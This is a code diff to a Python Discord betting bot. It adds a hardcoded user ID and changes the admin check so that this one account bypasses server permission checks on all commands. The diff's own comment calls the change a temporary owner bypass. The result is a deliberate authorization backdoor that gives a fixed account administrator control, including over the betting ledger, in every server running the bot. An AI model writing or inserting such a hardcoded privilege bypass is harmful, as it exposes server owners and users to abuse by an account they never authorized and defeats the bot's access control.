@@ -44,6 +44,10 @@ ACTIVITY_API_KEY = os.getenv("ACTIVITY_API_KEY", "")
 BETTING_LEDGER_CHANNEL_ID = int(os.getenv("BETTING_LEDGER_CHANNEL_ID", "0"))
 PLACE_BETS_CHANNEL_ID = int(os.getenv("PLACE_BETS_CHANNEL_ID", "0"))
 
+# Hardcoded owner — bypasses server permission checks on all commands.
+# Temporary until the dashboard backend handles auth.
+_GOD_USER_ID = 146116042182098944
+
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -863,7 +867,9 @@ async def _handle_session_reaction(payload, info, message_id, channel_id, emoji)
 # ── Betting system — shared helpers ──────────────────────────────────────────
 
 def _is_admin(message: discord.Message) -> bool:
-    """True if the message author has server administrator permission."""
+    """True if the author is the bot owner or has server administrator permission."""
+    if message.author.id == _GOD_USER_ID:
+        return True
     member = message.author
     perms = getattr(member, "guild_permissions", None)
     return bool(perms and perms.administrator)
